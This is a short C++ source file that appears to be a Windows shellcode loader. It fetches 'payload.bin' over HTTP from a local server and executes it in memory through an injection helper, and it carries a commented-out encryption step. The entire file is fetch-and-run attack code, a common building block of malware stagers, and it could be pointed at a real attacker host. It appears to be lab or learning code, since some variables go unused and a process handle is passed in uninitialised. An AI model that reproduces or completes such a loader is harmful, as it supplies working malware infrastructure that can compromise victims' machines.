
#include <iostream>
#include <string>
#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include "Libraries/FetchFromURL.h"


#include "Libraries/LocalInjection.h"

using namespace std;

int main()
{
    PBYTE  pPayloadAddress;
    DWORD pPayloadSize;
    string Url  = "http://localhost:8000/payload.bin";
    LPWSTR szProcessName = L"null";
    DWORD dwProcessID;
    HANDLE hProcess;
    PBYTE InjectionAddress;
    HANDLE hThread;
    
    if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, &pPayloadSize)){
        cout << "Failed to fetch payload" << endl;
        return 0;
    }

    //Encrypt(pPayloadAddress, pPayloadSize, NULL, NULL);
    

    if(!PayloadExecute(hProcess, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, &hThread)){
        cout << "Failed to execute payload" << endl;
        return 0;
    }

    return 0;
}
